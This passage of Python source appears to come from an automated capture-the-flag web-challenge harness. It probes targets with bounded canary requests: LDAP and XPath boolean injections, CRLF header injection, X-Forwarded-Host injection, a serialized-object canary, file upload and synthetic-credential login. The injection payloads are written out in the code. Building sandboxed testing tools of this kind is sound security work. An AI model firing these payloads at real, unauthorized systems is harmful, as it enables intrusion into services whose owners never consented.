        # canary is strict ASCII, for which modified UTF-8 equals UTF-8.
        return b"\xac\xed\x00\x05\x74" + struct.pack(">H", len(data)) + data, "java", "string"
    return None


def _deserialization_inert(target, ctx, state, contract, baselines):
    if _classes is None:
        return None
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "parser_route", "deserialization_route"), str)
    method = _alias(contract, ("method", "request_method"), str)
    transport = _alias(contract, ("transport", "request_transport"), str)
    field = _alias(contract, ("field", "blob_field", "object_field"), str, default=None)
    fmt = _alias(contract, ("format", "serialization_format"), str)
    encoding = _alias(contract, ("encoding", "blob_encoding"), str)
    inert_shape = _alias(contract, ("inert_shape", "object_shape"), str)
    canary = _alias(contract, ("canary", "canary_value"), str)
    readback_field = _alias(contract, ("readback_field", "decoded_field"), str)
    fields = (raw_route, method, transport, fmt, encoding, inert_shape, canary,
              readback_field)
    if any(item in (_MISSING, _AMBIGUOUS) for item in fields) or field is _AMBIGUOUS:
        return None
    route = _safe_route(raw_route, base_url)
    transport = _canonical(transport)
    fmt = _canonical(fmt)
    encoding = _canonical(encoding)
    inert_shape = _canonical(inert_shape)
    made = _inert_blob(fmt, canary) if CANARY_DS.fullmatch(canary) else None
    if (route is None or str(method).upper() != "POST"
            or transport not in ("json", "form", "raw")
            or encoding not in ("base64", "raw") or made is None
            or inert_shape != made[2] or (transport == "raw") != (field is None)
            or (field is not None and _field(field) is None)
            or _field(readback_field) is None
            or (transport != "raw" and encoding != "base64")
            or not _allowed(ctx, route) or not _can_send(ctx, state)):
        return None
    raw, expected_kind, _shape = made
    wire_value = (base64.b64encode(raw).decode("ascii") if encoding == "base64" else raw)
    try:
        classified = _classes.classify_serialized_blob(wire_value)
    except Exception:
        return None
    if not classified.get("serialized") or classified.get("kind") != expected_kind:
        return None
    if transport == "json":
        body = json.dumps({field: wire_value}, separators=(",", ":"), ensure_ascii=True)
        headers = {"Content-Type": "application/json"}
    elif transport == "form":
        body = urllib.parse.urlencode({field: wire_value})
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
    else:
        body = wire_value
        headers = {"Content-Type": "application/octet-stream"}
    if isinstance(body, str) and len(body.encode("utf-8")) > MAX_OUTER_BYTES:
        return None
    client = ctx.get("client")
    if client is None:
        return None
    state["terminal"] = True
    state["requests"] += 1
    state["posts"] += 1
    response = _response(client.request("POST", route, data=body, headers=headers,
                                        allow_redirects=False))
    # A returned proof alone does not prove the object was parsed: a service
    # could have reflected the base64/raw input beside a generic success page.
    # The exact contract therefore names one scalar readback field, and the
    # same strict JSON carrier that donates the proof must expose the canary as
    # that field's value.  Duplicate/colliding/multiple JSON views all fail in
    # _json_doc before proof extraction.
    doc = _json_doc(response)
    if (not isinstance(doc, dict) or readback_field not in doc
            or doc.get(readback_field) != canary):
        return None
    return _proof(response, baselines, _origin_host(base_url), state)


def _send_exact(ctx, state, method, route, *, data=None, headers=None, terminal=False):
    """Send one already-validated exact request and account before transport.

    Accounting before the call is intentional: a timeout may still have
    reached the target.  A terminal request therefore prevents a second class
    interpretation even when the response never arrives.
    """
    method = str(method or "").upper()
    if (method not in ("GET", "POST", "OPTIONS") or not isinstance(route, str)
            or not _allowed(ctx, route) or not _can_send(ctx, state)):
        return None
    client = ctx.get("client")
    if client is None:
        return None
    state["requests"] += 1
    if method == "POST":
        state["posts"] += 1
    if terminal or method == "POST":
        state["terminal"] = True
    return _response(client.request(method, route, data=data, headers=headers or {},
                                    allow_redirects=False))


def _control_baseline(response, baselines, *, empty_204_complete=False):
    value = _baseline(response)
    # A conforming 204 has no representation body.  forge_event deliberately
    # marks an ordinary empty response baseline incomplete, because an absent
    # body could otherwise hide parser loss.  Here the exact OPTIONS contract
    # and WebClient's framing guard establish that emptiness is the complete
    # representation; retain every response-header value as subtraction, but
    # remove only that generic empty-body marker.
    if empty_204_complete and isinstance(response, dict):
        try:
            status = int(response.get("status"))
        except (TypeError, ValueError, OverflowError):
            status = None
        body = response.get("body")
        if (status == 204 and body in (b"", "") and not response.get("framing_error")
                and response.get("truncated") is not True and isinstance(value, str)):
            marker = getattr(_proofs, "BASELINE_STRICT_INCOMPLETE",
                             "<!-- csctf-baseline-strict-set:incomplete -->")
            value = value.replace(marker, "")
    if value:
        baselines.append(value)


def _query_route(route, values):
    if not isinstance(route, str) or not isinstance(values, dict) or not values:
        return None
    try:
        encoded = urllib.parse.urlencode(values, doseq=False, safe="")
        made = route + ("&" if "?" in route else "?") + encoded
        if len(made.encode("utf-8")) > MAX_OUTER_BYTES:
            return None
        return made
    except (TypeError, ValueError, UnicodeError):
        return None


def _safe_json_read_body(value, *, depth=0, counter=None):
    """Return a detached bounded inert JSON value, or ``_AMBIGUOUS``.

    Exact resource selectors and pagination survive. Commands, credentials,
    URLs, proof strings, state-changing keys and unbounded containers do not.
    """
    counter = counter if counter is not None else [0]
    counter[0] += 1
    if counter[0] > 64 or depth > 4:
        return _AMBIGUOUS
    if value is None or isinstance(value, bool):
        return value
    if isinstance(value, int) and not isinstance(value, bool):
        return value if -(10 ** 9) <= value <= 10 ** 9 else _AMBIGUOUS
    if isinstance(value, str):
        try:
            destructive = _web.route_has_destructive_action(value)
        except Exception:
            return _AMBIGUOUS
        if (not 1 <= len(value) <= 256 or any(ord(char) < 0x20 for char in value)
                or value != value.strip()
                or _URLISH.search(value) or flagfmt.PAYOFF_ANYCASE.search(value)
                or flagfmt.TEXT.search(value)
                or destructive):
            return _AMBIGUOUS
        return value
    if isinstance(value, list):
        if not 1 <= len(value) <= 8:
            return _AMBIGUOUS
        out = []
        for child in value:
            item = _safe_json_read_body(child, depth=depth + 1, counter=counter)
            if item is _AMBIGUOUS:
                return _AMBIGUOUS
            out.append(item)
        return out
    if isinstance(value, dict):
        if not 1 <= len(value) <= 32:
            return _AMBIGUOUS
        out = {}
        for key, child in value.items():
            canonical = _canonical(key)
            if (not isinstance(key, str) or not JSON_PATH_KEY.fullmatch(key)
                    or JSON_BODY_FATAL.search(canonical)):
                return _AMBIGUOUS
            item = _safe_json_read_body(child, depth=depth + 1, counter=counter)
            if item is _AMBIGUOUS:
                return _AMBIGUOUS
            out[key] = item
        return out
    return _AMBIGUOUS


def _crlf_canary(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "read_route", "reflection_route"), str)
    method = _alias(contract, ("method", "request_method"), str)
    transport = _alias(contract, ("transport", "request_transport"), str)
    field = _alias(contract, ("field", "parameter", "redirect_parameter"), str)
    profile = _alias(contract, ("payload_profile", "profile"), str)
    canary = _alias(contract, ("canary", "canary_value"), str)
    control_value = _alias(contract, ("control_value", "safe_value"), str)
    fields = (raw_route, method, transport, field, profile, canary, control_value)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    if (route is None or str(method).upper() != "GET"
            or _canonical(transport) != "query" or _field(field) is None
            or _canonical(profile) != "inert_response_header"
            or not CANARY_CRLF.fullmatch(canary)
            or not SAFE_VALUE.fullmatch(control_value)
            or SENSITIVE_READ_ROUTE.search(route)
            or not _can_send(ctx, state, reserve=2)):
        return None
    control_route = _query_route(route, {field: control_value})
    payoff_route = _query_route(
        route, {field: control_value + "\r\nX-" + _slug().capitalize() + "-Canary: " + canary})
    if control_route is None or payoff_route is None:
        return None
    control = _send_exact(ctx, state, "GET", control_route)
    _control_baseline(control, baselines)
    response = _send_exact(ctx, state, "GET", payoff_route)
    return _proof(response, baselines, _origin_host(base_url), state)


def _host_header_canary(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "read_route", "sink_route"), str)
    method = _alias(contract, ("method", "request_method"), str)
    header = _alias(contract, ("header", "header_name"), str)
    canary = _alias(contract, ("canary_host", "host_canary", "canary"), str)
    fields = (raw_route, method, header, canary)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    # Host itself is deliberately excluded: changing the transport authority
    # can escape a virtual host.  This narrow reader exercises only the
    # conventional proxy metadata sink with a reserved, nonresolving TLD.
    if (route is None or str(method).upper() != "GET"
            or str(header).lower() != "x-forwarded-host"
            or not HOST_CANARY.fullmatch(canary)
            or SENSITIVE_READ_ROUTE.search(route)
            or not _can_send(ctx, state, reserve=2)):
        return None
    control = _send_exact(ctx, state, "GET", route)
    _control_baseline(control, baselines)
    response = _send_exact(ctx, state, "GET", route,
                           headers={"X-Forwarded-Host": canary})
    return _proof(response, baselines, _origin_host(base_url), state)


_BOOLEAN_PROFILES = {
    "ldap_filter_close": (
        "*)(objectClass=ctfDefinitelyAbsent)",
        "*)(|(objectClass=*))",
    ),
    "xpath_single_quote": ("' or '1'='0", "' or '1'='1"),
}


def _boolean_read_injection(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "read_route", "search_route"), str)
    method = _alias(contract, ("method", "request_method"), str)
    transport = _alias(contract, ("transport", "request_transport"), str)
    field = _alias(contract, ("field", "parameter", "query_parameter"), str)
    profile = _alias(contract, ("payload_profile", "profile"), str)
    read_only = _alias(contract, ("read_only", "side_effect_free"), bool)
    fields = (raw_route, method, transport, field, profile, read_only)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    pair = _BOOLEAN_PROFILES.get(_canonical(profile))
    if (route is None or str(method).upper() != "GET"
            or _canonical(transport) != "query" or _field(field) is None
            or read_only is not True or pair is None
            or SENSITIVE_READ_ROUTE.search(route)
            or not _can_send(ctx, state, reserve=2)):
        return None
    false_route = _query_route(route, {field: pair[0]})
    true_route = _query_route(route, {field: pair[1]})
    if false_route is None or true_route is None:
        return None
    control = _send_exact(ctx, state, "GET", false_route)
    _control_baseline(control, baselines)
    response = _send_exact(ctx, state, "GET", true_route)
    return _proof(response, baselines, _origin_host(base_url), state)


def _safe_rpc_value(value, depth=0):
    if depth > 2:
        return False
    if value is None or isinstance(value, bool):
        return True
    if isinstance(value, int) and not isinstance(value, bool):
        return -(2 ** 31) <= value < 2 ** 31
    if isinstance(value, str):
        return (bool(SAFE_VALUE.fullmatch(value))
                and not _web.route_has_destructive_action(value))
    if isinstance(value, list):
        return len(value) <= 8 and all(_safe_rpc_value(item, depth + 1) for item in value)
    if isinstance(value, dict):
        return (len(value) <= 8 and all(_field(key) is not None
                                        and not _web.route_has_destructive_action(str(key))
                                        and _safe_rpc_value(item, depth + 1)
                                        for key, item in value.items()))
    return False


def _soap_proof(response, baselines, host, state):
    """Strictly extract one successful SOAP/XML evidence element.

    The generic proof extractor intentionally treats XML labels as an unsure
    candidate.  An exact SOAP contract can be stronger: reject DTD/entities,
    parse one bounded document, require an affirmative status element, and
    require the sole wire-shaped token to be the value of ``proof`` or
    ``evidence``.  Baseline subtraction remains mandatory.
    """
    if response is None:
        return None
    try:
        if not 200 <= int(response.get("status")) < 300:
            return None
    except (TypeError, ValueError, OverflowError):
        return None
    headers = response.get("response_headers", response.get("headers", {}))
    ctype = ""
    if isinstance(headers, dict):
        ctype = next((str(value).lower() for key, value in headers.items()
                      if str(key).lower() == "content-type"), "")
    essence = ctype.split(";", 1)[0].strip()
    if essence not in {"text/xml", "application/soap+xml"}:
        return None
    if (_proofs is not None and hasattr(_proofs, "baseline_set_incomplete")
            and _proofs.baseline_set_incomplete(baselines)):
        return None
    views = _views(response)
    if len(views) != 1:
        return None
    text = views[0]
    if len(text.encode("utf-8", "replace")) > MAX_TEXT or re.search(
            r"(?is)<!\s*(?:doctype|entity)\b", text):
        return None
    try:
        root = ET.fromstring(text)
    except (ET.ParseError, ValueError, RecursionError):
        return None
    affirmative = False
    rejected = False
    labelled = []
    nodes = 0
    for node in root.iter():
        nodes += 1
        if nodes > 256:
            return None
        name = str(node.tag).rsplit("}", 1)[-1].lower()
        value = str(node.text or "").strip()
        if name in ("ok", "success", "status", "result") and value.lower() in {
                "true", "ok", "success", "accepted", "complete", "completed"}:
            affirmative = True
        if ((name in ("error", "failure", "denied", "rejected") and value)
                or name in ("ok", "success", "status", "result")
                and value.lower() in {"false", "error", "failure", "failed", "denied", "rejected"}):
            rejected = True
        if name in ("proof", "evidence") and PAYOFF_WIRE.fullmatch(value):
            labelled.append(value)
    all_wire = PAYOFF_SCAN.findall(text)
    baseline_wire = {match.group(0) for raw in baselines
                     for match in PAYOFF_SCAN.finditer(str(raw or "")[:MAX_TEXT])}
    if (not affirmative or rejected or len(labelled) != 1 or len(all_wire) != 1
            or all_wire != labelled or labelled[0] in baseline_wire):
        return None
    if isinstance(state, dict):
        state.setdefault("candidates", []).append(labelled[0])
        state["terminal"] = True
    return labelled[0]


def _pb_varint(data, offset):
    value = 0
    for shift in range(0, 70, 7):
        if offset >= len(data):
            return None
        byte = data[offset]
        offset += 1
        value |= (byte & 0x7f) << shift
        if not byte & 0x80:
            return value, offset
    return None


def _pb_fields(data):
    """Parse a bounded protobuf message without interpreting unknown fields."""
    if not isinstance(data, bytes) or len(data) > 64 * 1024:
        return None
    rows = []
    offset = 0
    while offset < len(data) and len(rows) < 128:
        got = _pb_varint(data, offset)
        if got is None:
            return None
        key, offset = got
        number, wire = key >> 3, key & 7
        if number <= 0 or number > 2048:
            return None
        if wire == 0:
            got = _pb_varint(data, offset)
            if got is None:
                return None
            value, offset = got
        elif wire == 1:
            if offset + 8 > len(data):
                return None
            value, offset = data[offset:offset + 8], offset + 8
        elif wire == 2:
            got = _pb_varint(data, offset)
            if got is None:
                return None
            length, offset = got
            if length > 64 * 1024 or offset + length > len(data):
                return None
            value, offset = data[offset:offset + length], offset + length
        elif wire == 5:
            if offset + 4 > len(data):
                return None
            value, offset = data[offset:offset + 4], offset + 4
        else:
            return None
        rows.append((number, wire, value))
    return rows if offset == len(data) and len(rows) <= 128 else None


def _grpc_web_proof(response, baselines, state, success_field, evidence_field):
    """Strictly parse one gRPC-Web data frame plus a successful trailer."""
    if response is None:
        return None
    try:
        if not 200 <= int(response.get("status")) < 300:
            return None
    except (TypeError, ValueError, OverflowError):
        return None
    if (_proofs is not None and hasattr(_proofs, "baseline_set_incomplete")
            and _proofs.baseline_set_incomplete(baselines)):
        return None
    headers = response.get("response_headers", response.get("headers", {}))
    ctype = ""
    if isinstance(headers, dict):
        ctype = next((str(value).lower() for key, value in headers.items()
                      if str(key).lower() == "content-type"), "")
    raw = response.get("body", b"")
    if isinstance(raw, str):
        try:
            raw = raw.encode("ascii", "strict")
        except UnicodeError:
            return None
    if not isinstance(raw, (bytes, bytearray)) or len(raw) > 128 * 1024:
        return None
    wire = bytes(raw)
    essence = ctype.split(";", 1)[0].strip()
    if essence in {"application/grpc-web-text", "application/grpc-web-text+proto"}:
        try:
            wire = base64.b64decode(wire, validate=True)
        except Exception:
            return None
    elif essence not in {"application/grpc-web", "application/grpc-web+proto"}:
        return None
    data_frames, trailers = [], []
    offset = 0
    while offset < len(wire) and len(data_frames) + len(trailers) < 8:
        if offset + 5 > len(wire):
            return None
        flag = wire[offset]
        length = int.from_bytes(wire[offset + 1:offset + 5], "big")
        offset += 5
        if length > 64 * 1024 or offset + length > len(wire):
            return None
        payload = wire[offset:offset + length]
        offset += length
        if flag == 0:
            data_frames.append(payload)
        elif flag == 0x80:
            trailers.append(payload)
        else:
            return None
    if offset != len(wire) or len(data_frames) != 1 or len(trailers) != 1:
        return None
    try:
        trailer = trailers[0].decode("ascii", "strict")
    except UnicodeError:
        return None
    trailer_rows = [line.split(":", 1) for line in trailer.split("\r\n") if line]
    if (any(len(row) != 2 for row in trailer_rows)
            or [value.strip() for name, value in trailer_rows
                if name.strip().lower() == "grpc-status"] != ["0"]):
        return None
    fields = _pb_fields(data_frames[0])
    if fields is None:
        return None
    successes = [value for number, kind, value in fields
                 if number == success_field and kind == 0]
    evidences = [value for number, kind, value in fields
                 if number == evidence_field and kind == 2]
    if successes != [1] or len(evidences) != 1:
        return None
    try:
        value = evidences[0].decode("ascii", "strict")
    except UnicodeError:
        return None
    if not PAYOFF_WIRE.fullmatch(value):
        return None
    proof_hits = PAYOFF_SCAN.findall(data_frames[0].decode("latin-1"))
    baseline_wire = {match.group(0) for raw_baseline in baselines
                     for match in PAYOFF_SCAN.finditer(str(raw_baseline or "")[:MAX_TEXT])}
    if proof_hits != [value] or value in baseline_wire:
        return None
    state.setdefault("candidates", []).append(value)
    state["terminal"] = True
    return value


def _rpc_contract(target, ctx, state, contract, baselines, protocol):
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "rpc_route", "endpoint"), str)
    control_raw = _alias(contract, ("control_route", "read_control_route"), str)
    declared = _alias(contract, ("protocol", "rpc_protocol"), str)
    operation = _alias(contract, ("operation", "method_name", "rpc_method"), str)
    read_only = _alias(contract, ("read_only", "side_effect_free"), bool)
    fields = (raw_route, control_raw, declared, operation, read_only)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    control_route = _safe_route(control_raw, base_url)
    if (route is None or control_route is None or _canonical(declared) != protocol
            or read_only is not True or not READ_OPERATION.fullmatch(operation)
            or _web.route_has_destructive_action(operation)
            or not _can_send(ctx, state, reserve=2)):
        return None
    grpc_fields = None
    if protocol == "json_rpc":
        params = _alias(contract, ("params", "parameters", "arguments"),
                        (dict, list), default=[])
        if params is _AMBIGUOUS or not _safe_rpc_value(params):
            return None
        body = json.dumps({"jsonrpc": "2.0", "id": f"{_slug()}-read-1",
                           "method": operation, "params": params},
                          separators=(",", ":"), ensure_ascii=True)
        headers = {"Content-Type": "application/json"}
    elif protocol == "soap":
        namespace = _alias(contract, ("namespace", "target_namespace"), str)
        action = _alias(contract, ("soap_action", "action"), str)
        args = _alias(contract, ("params", "parameters", "arguments"), dict, default={})
        if (namespace in (_MISSING, _AMBIGUOUS) or action in (_MISSING, _AMBIGUOUS)
                or args is _AMBIGUOUS or not isinstance(args, dict)
                or not _safe_rpc_value(args) or len(namespace) > 512 or len(action) > 512
                or any(char in namespace + action for char in "\r\n\x00")
                or _web.route_has_destructive_action(action)
                or _field(operation) is None):
            return None
        children = "".join(
            f"<{name}>{html.escape(str(value), quote=True)}</{name}>"
            for name, value in args.items())
        body = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                f"<soap:Body><m:{operation} xmlns:m=\"{html.escape(namespace, quote=True)}\">"
                f"{children}</m:{operation}></soap:Body></soap:Envelope>")
        headers = {"Content-Type": "text/xml; charset=utf-8", "SOAPAction": action}
    else:
        empty = _alias(contract, ("empty_request", "empty_message"), bool)
        response_profile = _alias(contract, ("response_profile", "response_shape"), str)
        success_field = _alias(contract, ("success_field", "success_field_number"), int)
        evidence_field = _alias(contract, ("evidence_field", "evidence_field_number"), int)
        if (empty is not True or response_profile in (_MISSING, _AMBIGUOUS)
                or _canonical(response_profile) != "protobuf_bool_evidence"
                or success_field in (_MISSING, _AMBIGUOUS)
                or evidence_field in (_MISSING, _AMBIGUOUS)
                or isinstance(success_field, bool) or isinstance(evidence_field, bool)
                or not 1 <= success_field <= 32 or not 1 <= evidence_field <= 32
                or success_field == evidence_field):
            return None
        grpc_fields = (success_field, evidence_field)
        body = b"\x00\x00\x00\x00\x00"
        headers = {"Content-Type": "application/grpc-web+proto",
                   "X-Grpc-Web": "1", "X-User-Agent": f"{_slug()}-cold-reader/1"}
    if ((isinstance(body, str) and len(body.encode("utf-8")) > MAX_OUTER_BYTES)
            or isinstance(body, bytes) and len(body) > MAX_OUTER_BYTES):
        return None
    # Validate the entire protocol body before even the read-only control, so
    # an incomplete exact contract is genuinely zero wire.
    control = _send_exact(ctx, state, "GET", control_route)
    _control_baseline(control, baselines)
    if not _can_send(ctx, state):
        return None
    response = _send_exact(ctx, state, "POST", route, data=body, headers=headers,
                           terminal=True)
    if protocol == "soap":
        return _soap_proof(response, baselines, _origin_host(base_url), state)
    if protocol == "grpc_web":
        return _grpc_web_proof(response, baselines, state, *grpc_fields)
    return _proof(response, baselines, _origin_host(base_url), state)


def _json_rpc_read(target, ctx, state, contract, baselines):
    return _rpc_contract(target, ctx, state, contract, baselines, "json_rpc")


def _soap_read(target, ctx, state, contract, baselines):
    return _rpc_contract(target, ctx, state, contract, baselines, "soap")


def _grpc_web_read(target, ctx, state, contract, baselines):
    return _rpc_contract(target, ctx, state, contract, baselines, "grpc_web")


def _upload_canary(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "upload_route", "upload_endpoint"), str)
    template = _alias(contract, ("read_route_template", "fetch_route_template"), str)
    method = _alias(contract, ("method", "upload_method"), str)
    field = _alias(contract, ("field", "upload_field", "file_field"), str)
    canary = _alias(contract, ("canary", "canary_value"), str)
    profile = _alias(contract, ("content_profile", "payload_profile"), str)
    isolated = _alias(contract, ("isolated_instance", "isolated_storage"), bool)
    missing_status = _alias(contract, ("missing_status", "absent_status"), int)
    fields = (raw_route, template, method, field, canary, profile, isolated, missing_status)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    profiles = {
        "plain_text": (".txt", "text/plain", b""),
        "gif_marker": (".gif", "image/gif", b"GIF89a"),
        "png_marker": (".png", "image/png", b"\x89PNG\r\n\x1a\n"),
    }
    shape = profiles.get(_canonical(profile))
    if (route is None or str(method).upper() != "POST" or _field(field) is None
            or not CANARY_UPLOAD.fullmatch(canary) or isolated is not True
            or isinstance(missing_status, bool) or missing_status not in (404, 410)
            or shape is None or template.count("{filename}") != 1
            or "{" in template.replace("{filename}", "")
            or "}" in template.replace("{filename}", "")
            or not _can_send(ctx, state, reserve=3)):
        return None
    suffix, content_type, magic = shape
    filename = canary + suffix
    try:
        raw_read = template.format(filename=urllib.parse.quote(filename, safe=""))
    except (KeyError, IndexError, ValueError):
        return None
    read_route = _safe_route(raw_read, base_url)
    if read_route is None:
        return None
    before = _send_exact(ctx, state, "GET", read_route)
    try:
        if before is None or int(before.get("status")) != missing_status:
            return None
    except (TypeError, ValueError, OverflowError):
        return None
    _control_baseline(before, baselines)
    if not _can_send(ctx, state, reserve=2):
        return None
    boundary = "----" + _slug() + canary
    content = magic + canary.encode("ascii")
    body = (b"--" + boundary.encode("ascii") + b"\r\n"
            + f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode("ascii")
            + f"Content-Type: {content_type}\r\n\r\n".encode("ascii")
            + content + b"\r\n--" + boundary.encode("ascii") + b"--\r\n")
    uploaded = _send_exact(
        ctx, state, "POST", route, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + boundary}, terminal=True)
    try:
        if uploaded is None or not 200 <= int(uploaded.get("status")) < 300:
            return None
    except (TypeError, ValueError, OverflowError):
        return None
    _control_baseline(uploaded, baselines)
    if not _can_send(ctx, state):
        return None
    response = _send_exact(ctx, state, "GET", read_route, terminal=True)
    if not any(canary in view for view in _views(response)):
        return None
    return _proof(response, baselines, _origin_host(base_url), state)


def _allow_header_methods(response):
    if not isinstance(response, dict):
        return None
    pairs = response.get("response_header_pairs")
    values = []
    if isinstance(pairs, (list, tuple)):
        values = [str(row[1]) for row in list(pairs)[:128]
                  if isinstance(row, (list, tuple)) and len(row) == 2
                  and str(row[0]).lower() == "allow"]
    else:
        headers = response.get("response_headers", response.get("headers", {}))
        if isinstance(headers, dict):
            values = [str(value) for key, value in headers.items() if str(key).lower() == "allow"]
    if len(values) != 1:
        return None
    methods = [part.strip().upper() for part in values[0].split(",")]
    if not methods or any(not re.fullmatch(r"[A-Z]{3,12}", item) for item in methods):
        return None
    return set(methods) if len(methods) == len(set(methods)) else None


def _json_body_read(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "read_route", "endpoint"), str)
    method = _alias(contract, ("method", "request_method"), str)
    control_method = _alias(contract, ("control_method", "discovery_method"), str)
    control_status = _alias(contract, ("control_status", "options_status"), int)
    transport = _alias(contract, ("transport", "request_transport"), str)
    authority = _alias(contract, ("body_authority", "request_body_authority"), str)
    body_value = _alias(contract, ("body", "request_body", "json_body"), dict)
    scope = _alias(contract, ("data_scope", "resource_scope"), str)
    isolated = _alias(contract, ("isolated_instance", "synthetic_data"), bool)
    read_only = _alias(contract, ("read_only", "side_effect_free"), bool)
    profile = _alias(contract, ("response_profile", "proof_profile"), str)
    effect = _alias(contract, ("read_effect", "proof_effect", "effect"), str)
    fields = (raw_route, method, control_method, control_status, transport, authority,
              body_value, scope, isolated, read_only, profile, effect)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    body = _safe_json_read_body(body_value)
    if (route is None or str(method).upper() != "POST" or str(control_method).upper() != "OPTIONS"
            or isinstance(control_status, bool) or control_status not in (200, 204)
            or _canonical(transport) != "json"
            or _canonical(authority) != "exact_target_example"
            or _canonical(scope) != "challenge_synthetic" or isolated is not True
            or read_only is not True or _canonical(profile) != "json_effect_evidence"
            or not isinstance(effect, str) or not SAFE_VALUE.fullmatch(effect)
            or body is _AMBIGUOUS or not isinstance(body, dict)
            or not _allowed(ctx, route) or not _can_send(ctx, state, reserve=2)):
        return None
    try:
        wire = json.dumps(body, separators=(",", ":"), ensure_ascii=True, allow_nan=False)
    except (TypeError, ValueError, UnicodeError):
        return None
    if len(wire.encode("utf-8")) > MAX_OUTER_BYTES:
        return None

    control = _send_exact(ctx, state, "OPTIONS", route)
    try:
        if control is None or int(control.get("status")) != control_status:
            return None
    except (TypeError, ValueError, OverflowError):
        return None
    if _allow_header_methods(control) != {"OPTIONS", "POST"}:
        return None
    _control_baseline(control, baselines, empty_204_complete=(control_status == 204))
    if not _can_send(ctx, state):
        return None
    response = _send_exact(
        ctx, state, "POST", route, data=wire,
        headers={"Content-Type": "application/json"}, terminal=True)
    document = _json_doc(response)
    if (not isinstance(document, dict) or document.get("ok") is not True
            or document.get("effect") != effect):
        return None
    return _proof(response, baselines, _origin_host(base_url), state)


def _synthetic_credential_read(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    raw_login = _alias(contract, ("login_route", "session_route"), str)
    raw_read = _alias(contract, ("read_route", "protected_route"), str)
    method = _alias(contract, ("method", "login_method"), str)
    transport = _alias(contract, ("transport", "login_transport"), str)
    user_field = _alias(contract, ("username_field", "user_field"), str)
    pass_field = _alias(contract, ("password_field", "secret_field"), str)
    username = _alias(contract, ("username", "synthetic_username"), str)
    password = _alias(contract, ("password", "synthetic_password"), str)
    scope = _alias(contract, ("credential_scope", "account_scope"), str)
    isolated = _alias(contract, ("isolated_instance", "synthetic_account"), bool)
    read_only = _alias(contract, ("read_only", "side_effect_free"), bool)
    fields = (raw_login, raw_read, method, transport, user_field, pass_field,
              username, password, scope, isolated, read_only)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    login_route = _safe_route(raw_login, base_url)
    read_route = _safe_route(raw_read, base_url)
    transport = _canonical(transport)
    printable = lambda value: (1 <= len(value) <= 256
                               and all(0x20 <= ord(char) <= 0x7e for char in value)
                               and not any(char in value for char in "\r\n\x00"))
    if (login_route is None or read_route is None or str(method).upper() != "POST"
            or transport not in ("json", "form") or _field(user_field) is None
            or _field(pass_field) is None or not printable(username) or not printable(password)
            or _canonical(scope) != "challenge_synthetic" or isolated is not True
            or read_only is not True or not _can_send(ctx, state, reserve=3)):
        return None
    def execute():
        before = _send_exact(ctx, state, "GET", read_route)
        try:
            if before is None or int(before.get("status")) not in (401, 403):
                return None
        except (TypeError, ValueError, OverflowError):
            return None
        _control_baseline(before, baselines)
        values = {user_field: username, pass_field: password}
        if transport == "json":
            body = json.dumps(values, separators=(",", ":"), ensure_ascii=True)
            headers = {"Content-Type": "application/json"}
        else:
            body = urllib.parse.urlencode(values)
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        login = _send_exact(ctx, state, "POST", login_route, data=body, headers=headers,
                            terminal=True)
        try:
            if login is None or not 200 <= int(login.get("status")) < 300:
                return None
        except (TypeError, ValueError, OverflowError):
            return None
        _control_baseline(login, baselines)
        if not _can_send(ctx, state):
            return None
        response = _send_exact(ctx, state, "GET", read_route, terminal=True)
        return _proof(response, baselines, _origin_host(base_url), state)

    try:
        return execute()
    finally:
        # This class is terminal after its POST. Retain route/status evidence,
        # but purge its synthetic credential and minted session after the read.
        redact = getattr(ctx.get("client"), "redact_log", None)
        if callable(redact):
            try:
                redact((username, password), clear_cookies=True)
            except Exception:
                pass


def _nested_json_value(document, path):
    """One exact, bounded JSON object path; array selection and dotted aliases are intentionally unsupported."""
    if (not isinstance(path, list) or not 1 <= len(path) <= 4
            or not all(isinstance(key, str) and JSON_PATH_KEY.fullmatch(key) for key in path)):
        return _AMBIGUOUS
    value = document
    for key in path:
        if not isinstance(value, dict) or key not in value:
            return _MISSING
        value = value[key]
    return value


def _synthetic_bearer_read(target, ctx, state, contract, baselines):
    """Authenticate one target-published synthetic account, then perform one exact bearer read.

    The second unauthenticated control after login proves that neither a newly
    minted cookie nor server-side association unlocked the protected route.
    Only then may the exact nested target-issued token cross the Authorization
    boundary.  The POST is terminal and every authority value is purged from
    the retained request log in ``finally``.
    """
    base_url = str(target.get("url") or "")
    raw_login = _alias(contract, ("login_route", "session_route"), str)
    raw_read = _alias(contract, ("read_route", "protected_route"), str)
    method = _alias(contract, ("method", "login_method"), str)
    transport = _alias(contract, ("transport", "login_transport"), str)
    user_field = _alias(contract, ("username_field", "user_field"), str)
    pass_field = _alias(contract, ("password_field", "secret_field"), str)
    username = _alias(contract, ("username", "synthetic_username"), str)
    password = _alias(contract, ("password", "synthetic_password"), str)
    scope = _alias(contract, ("credential_scope", "account_scope"), str)
